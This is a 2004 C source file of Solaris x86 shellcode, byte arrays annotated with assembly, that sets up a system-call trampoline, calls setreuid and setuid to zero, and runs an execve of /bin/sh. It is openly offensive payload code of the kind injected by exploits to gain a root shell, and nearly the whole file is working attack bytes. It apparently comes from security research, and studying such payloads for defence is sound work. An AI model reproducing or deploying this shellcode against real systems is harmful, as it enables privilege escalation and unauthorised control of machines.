/*
 *  sol-x86-shellcode.c
 *  Copyright 2004 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

char syscallcode[]=         /*  14 bytes                          */
    "\x68\xff\xd8\xff\x3c"  /*  pushl   $0x3cffd8ff               */
    "\x6a\x65"              /*  pushl   $0x65                     */
    "\x89\xe6"              /*  movl    %esp,%esi                 */
    "\xf7\x56\x04"          /*  notl    0x04(%esi)                */
    "\xf6\x16"              /*  notb    (%esi)                    */
;

char setreuidcode[]=        /*  8 bytes                           */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x50"                  /*  pushl   %eax                      */
    "\xb0\xca"              /*  movb    $0xca,%al                 */
    "\xff\xd6"              /*  call    *%esi                     */
;

char setuidcode[]=          /*  7 bytes                           */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\xb0\x17"              /*  movb    $0x17,%al                 */
    "\xff\xd6"              /*  call    *%esi                     */
;

char exitcode[]=            /*  7 bytes                           */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\xb0\x01"              /*  movb    $0x01,%al                 */
    "\xff\xd6"              /*  call    *%esi                     */
;

char shellcode[]=           /*  26 bytes                          */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x68\x2f\x2f\x73\x68"  /*  pushl   $0x68732f2f               */
    "\x68\x2f\x62\x69\x6e"  /*  pushl   $0x6e69622f               */
    "\x89\xe3"              /*  movl    %esp,%ebx                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x51"                  /*  pushl   %ecx                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\xb0\x3b"              /*  movb    $0x3b,%al                 */
    "\xff\xd6"              /*  call    *%esi                     */
;

